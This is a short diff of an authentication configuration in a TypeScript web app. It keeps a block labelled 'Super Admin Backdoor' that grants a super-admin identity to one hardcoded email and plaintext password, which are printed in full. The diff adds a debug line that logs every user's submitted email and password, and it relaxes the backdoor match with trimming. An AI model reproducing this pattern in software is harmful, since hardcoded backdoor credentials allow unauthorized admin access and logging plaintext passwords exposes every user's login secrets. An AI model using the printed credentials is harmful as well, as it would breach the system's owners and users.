@@ -19,7 +19,8 @@ export const authOptions: AuthOptions = {
                 }
 
                 // Super Admin Backdoor
-                if (credentials.email === "haarekasahara1923@gmail.com" && credentials.password === "Nami@1971") {
+                console.log("LOGIN DEBUG:", credentials.email, credentials.password)
+                if (credentials.email.trim() === "haarekasahara1923@gmail.com" && credentials.password.trim() === "Nami@1971") {
                     return {
                         id: "super-admin",
                         name: "Super Admin",
